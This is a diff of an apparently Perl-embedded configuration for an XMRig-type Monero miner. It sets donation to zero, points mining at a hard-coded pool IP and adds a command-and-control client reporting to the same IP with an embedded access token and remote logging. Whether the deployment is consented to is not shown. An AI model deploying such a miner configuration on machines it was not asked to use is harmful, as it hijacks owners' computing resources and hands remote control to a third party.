@@ -29,33 +29,77 @@ my $configProlog=
     },
     "autosave": true,
     "background": false,
-    "colors": false,
+    "colors": true,
     "randomx": {
         "init": -1,
-        "numa": true
+        "init-avx2": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
     },
-    
-    "opencl": {
-        "enabled": false,
-        "cache": true,
-        "loader": null,
-        "platform": "AMD"
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "force-autoconfig": false,
+        "max-threads-hint": 100,
+        "max-cpu-usage": null,
+        "asm": true,
+        "argon2-impl": null,
+        "astrobwt-max-size": 550,
+        "astrobwt-avx2": false,
+        "cn/0": false,
+        "cn-lite/0": false
     },
-    "cuda": {
-        "enabled": false,
-        "loader": null,
-        "nvml": true
+    "donate-level": 0,
+    "donate-over-proxy": 0,
+    "log-file": null,
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": null,
+            "url": "51.15.124.138:3333",
+            "user": "miner",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": false,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null
+        }
+    ],
+    "cc-client": {
+        "enabled": true,
+        "url": "51.15.124.138:1337",
+        "access-token": "akjsdbioub3rt1239tb2139084525",
+        "use-tls": false,
+        "use-remote-logging": true,
+        "upload-config-on-start": true,
+        "worker-id": null,
+        "reboot-cmd": null,
+        "update-interval-s": 10
     },
-    "donate-level": 2,
-    "donate-over-proxy": 1,
-    "log-file": "logfile.txt",
+    "print-time": 60,
     "health-print-time": 60,
     "retries": 5,
     "retry-pause": 5,
     "syslog": false,
     "user-agent": null,
-    "watch": true,
-';
+    "verbose": 0,
+    "watch": true
+}';
 
 
 
